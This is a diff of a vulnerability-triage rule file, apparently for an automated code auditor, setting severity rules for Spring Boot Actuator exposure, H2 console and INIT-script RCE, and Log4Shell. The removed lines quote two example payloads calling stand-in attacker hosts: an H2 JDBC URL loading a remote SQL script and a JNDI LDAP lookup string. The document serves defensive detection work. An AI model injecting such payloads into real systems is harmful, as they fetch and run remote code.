@@ -1,87 +1,126 @@
 # 组件漏洞（Actuator + H2 RCE + Log4Shell）判断知识
 
-本类别覆盖特定依赖/组件的配置和版本风险。
+## Use When
 
----
+Use this skill to validate component/configuration risks where dependency,
+version, profile, exposure, and routing context matter more than a single taint
+sink. Covered areas include Spring Boot Actuator exposure, H2 console/INIT RCE,
+and Log4Shell-style logging sinks.
 
-## A. Spring Boot Actuator 暴露判断知识
+## Candidate Fields That Matter
 
-**只要 `spring-boot-starter-actuator` 在依赖中，Actuator 即默认存在。**
+- `techProfile.dependencies`: group/artifact/version when available.
+- Config files: application YAML/properties, profile-specific config, env-backed
+  values, and management/server port settings.
+- Security configuration and route matchers.
+- Candidate sink path when user input reaches logging, JNDI lookup, actuator
+  endpoint, or H2 configuration.
+- Whether evidence is under production source/config or only test fixtures.
 
-高危端点：`/actuator/env`（泄露密码）、`/actuator/heapdump`（下载堆内存）、`/actuator/shutdown`（关闭应用）。
+## Common Verdict Rules
 
-### Actuator 判断规则
+- Confirm only when dependency/config evidence, production reachability,
+  exposure, sensitive endpoint/sink, and missing or bypassed protection are
+  visible.
+- Downgrade when production profile, route reachability, version, trust boundary,
+  or runtime configuration is ambiguous.
+- Mark NEEDS_REVIEW when the endpoint/sink is sensitive but authorization,
+  version, profile, or runtime configuration evidence is incomplete.
+- Suppress only when effective protection or fixed-version evidence is visible
+  and applies before exposure or exploitation.
 
-| 场景 | 严重度 |
-|------|--------|
-| Actuator 存在 + 完全无 Security 配置 | **CRITICAL** |
-| Actuator 存在 + 有 Security 但未覆盖 `/actuator` + `include=*` | **CRITICAL** |
-| Actuator 存在 + 有 Security 但未覆盖 `/actuator` + 默认暴露 | **HIGH** |
-| 自定义 `@Endpoint` 无认证 | **HIGH** |
-| 仅暴露 health/info + 有认证 | 安全，不上报 |
+Effective protection must cover the actual management route, component endpoint,
+profile, port, base path, logger/JNDI path, or H2 console route. It must not be
+bypassed by profile activation, management-port separation, security matcher
+order, proxy routing, or alternate endpoint names.
 
-### Actuator 验证要点
+For stored or second-order candidates, confirm field correspondence: the
+externally written field, DB column, mapper property, cache key, serialized
+property, or config key must be the same value later read and used by the
+component sink. Repository/entity identity alone is supporting evidence.
 
-- 用 Grep 搜索 `actuator` 相关依赖和配置
-- 检查 `application.yml`/`application.properties` 中的 `management.endpoints.web.exposure.include`
-- 检查 `SecurityFilterChain` 是否覆盖 `/actuator/**` 路径
-- 仅在 `test/` 目录下发现 → 降级为 **MEDIUM**
-- Spring Boot 默认仅暴露 `/actuator/health` 和 `/actuator/info`
-- **只要 actuator 在依赖中 + 无 Security 配置 → 必须上报 CRITICAL**
+## Actuator Conditions
 
-`rule_id` 命名：`actuator-no-security`、`actuator-exposed-no-auth`、`actuator-custom-endpoint`。
+| Condition | Verdict | Severity |
+|---|---|---|
+| Actuator dependency exists, sensitive endpoints are exposed, and no auth covers `/actuator/**` | Confirm | CRITICAL |
+| `management.endpoints.web.exposure.include=*` and security does not cover actuator | Confirm | CRITICAL |
+| Sensitive custom `@Endpoint`/`@RestControllerEndpoint` mutates state without auth | Confirm | HIGH |
+| Only `health`/`info` are exposed and security posture is normal | Suppress | — |
+| Evidence exists only in test profile or test source | Downgrade | MEDIUM/LOW |
 
----
+Actuator dependency alone is not enough for CRITICAL. Confirm exposed endpoint
+set, security coverage, management port/base path, and production relevance.
 
-## B. H2 数据库 RCE 判断知识
+Sensitive actuator endpoints include `env`, `configprops`, `heapdump`,
+`threaddump`, `logfile`, `loggers`, `shutdown`, `jolokia`, `prometheus` with
+sensitive labels, custom state-changing endpoints, and endpoints exposing
+secrets or runtime internals.
 
-H2 嵌入式数据库的两类高危 RCE 路径：
-1. **H2 Console 未授权访问**：`spring.h2.console.enabled=true` 且无认证，攻击者通过 `/h2-console` 执行 `CREATE ALIAS` 调用 Java 代码
-2. **JDBC URL INIT 脚本**：`jdbc:h2:mem:test;INIT=RUNSCRIPT FROM 'http://evil.com/x.sql'`
+## H2 Conditions
 
-### H2 RCE 判断规则
+| Condition | Verdict | Severity |
+|---|---|---|
+| H2 console is enabled in production and unauthenticated | Confirm | CRITICAL/HIGH |
+| H2 console is enabled with weak or missing route security and vulnerable H2 version | Confirm | HIGH/CRITICAL |
+| JDBC URL contains `INIT=RUNSCRIPT` or equivalent script loading | Confirm | CRITICAL |
+| H2 appears only in tests/dev profile with no production activation | Downgrade or suppress | LOW/MEDIUM |
 
-| 场景 | 严重度 |
-|------|--------|
-| H2 Console 启用 + 无认证 + H2 < 2.x | **CRITICAL** |
-| H2 Console 启用 + 有认证但版本 < 2.x | **HIGH** |
-| JDBC URL 含 INIT/RUNSCRIPT 参数 | **CRITICAL** |
-| 仅测试目录中 H2 配置 | **MEDIUM** |
+For H2 console, impact depends on production exposure, authentication, frame
+options/security config, and H2 version.
 
-### H2 RCE 验证要点
+H2 console exposure requires production activation, reachable route, weak or
+missing auth, and relevant version/config evidence. Devtools or test-only H2
+should be downgraded unless production profile activation is visible.
 
-- 用 Grep 搜索 `h2.console.enabled`、`h2-console`、`INIT=RUNSCRIPT`
-- 结合 tech_profile 中的 H2 版本判断（H2 2.x 修复了部分 Console RCE）
-- 检查 JDBC URL 是否来自配置文件还是用户可控输入
-- 仅在 `test/` 目录或 test profile 中发现 → 风险降低
-- 检查 SecurityFilterChain 是否保护了 `/h2-console/**`
+## Log4Shell Conditions
 
-`rule_id` 命名：`h2-console-exposed`、`h2-init-script`。
+| Condition | Verdict | Severity |
+|---|---|---|
+| User-controlled value reaches logger and `log4j-core` 2.0-beta9 through 2.14.1 is present | Confirm | CRITICAL |
+| User-controlled value reaches logger and version is unknown or 2.15/2.16 | Confirm | HIGH |
+| Direct JNDI lookup sink receives attacker value | Confirm | CRITICAL |
+| Version is 2.17.1+ or `log4j-core` is absent | Suppress/downgrade | —/LOW |
+| Logging call contains only static text or server-generated IDs | Suppress | — |
 
----
+Consider mitigations such as `log4j2.formatMsgNoLookups=true`,
+`LOG4J_FORMAT_MSG_NO_LOOKUPS`, JndiLookup removal, and fixed versions. Mitigation
+quality affects confidence and severity.
 
-## C. Log4Shell (CVE-2021-44228) 判断知识
+`log4j-api` alone is insufficient. Confirm vulnerable Log4Shell only when
+`log4j-core` is present and the affected version/configuration is reachable.
 
-Log4j 2.x（< 2.15.0）解析日志中的 `${jndi:ldap://attacker.com/a}` 触发 RCE，CVSS 10.0。
-- **受影响**：log4j-core 2.0-beta9 ~ 2.14.1
-- **部分缓解**：2.15.0
-- **完全修复**：2.17.1+
+## False Positive Suppressors
 
-### Log4Shell 判断规则
+Do not report when:
 
-| 场景 | 严重度 |
-|------|--------|
-| 用户输入 → Logger + 版本 2.0~2.14.1 | **CRITICAL** |
-| 用户输入 → Logger + 版本未知/2.15~2.16 | **HIGH** |
-| 用户输入 → Logger + 版本 ≥ 2.17.1 | **LOW**（已修复） |
-| 无用户输入流向 Logger | 安全，不上报 |
+- Dependency/config evidence is test-only or inactive for production and no path
+  activates it.
+- A security filter chain clearly protects the component path and denies
+  unauthenticated/unauthorized access.
+- Version evidence proves the vulnerable component is fixed and no dangerous
+  configuration remains.
+- The candidate sink is present but no user-controlled data reaches it.
 
-### Log4Shell 验证要点
+## Severity And Confidence
 
-- 首先检查 tech_profile 中的 log4j 版本
-- 候选路径终点为 JNDI_LOOKUP sink 时直接确认——但本类别更关注日志调用
-- 用 Grep 搜索 `logger.info`/`logger.error` 等调用，检查参数是否含 HTTP 请求值
-- 检查 `log4j2.formatMsgNoLookups=true` 系统属性或环境变量（2.10+ 缓解）
-- 检查 `LOG4J_FORMAT_MSG_NO_LOOKUPS` 环境变量
+- CRITICAL/HIGH: production-exposed RCE-capable component with no effective auth
+  or vulnerable Log4Shell taint path.
+- HIGH/HIGH: sensitive component exposed with partial auth/version uncertainty.
+- MEDIUM/MEDIUM: dev/test/profile ambiguity or mitigated vulnerable component.
+- LOW/MEDIUM: informational exposure or fixed version with residual hardening gap.
 
-`rule_id` 命名：`log4shell-taint`、`log4j-version-vulnerable`。
+## Evidence Requirements
+
+A valid component finding should cite:
+
+- Dependency and version evidence, or the absence/ambiguity of version evidence.
+- Production config or route exposure evidence.
+- Security coverage considered and why it is insufficient.
+- Taint path to logger/JNDI when claiming Log4Shell.
+- Profile/test-only status when downgrading.
+- Suppressors considered and why they do not apply.
+
+`rule_id` values: `actuator-no-security`, `actuator-exposed-no-auth`,
+`actuator-custom-endpoint`, `h2-console-exposed`, `h2-init-script`,
+`log4shell-taint`, `log4j-version-vulnerable`.
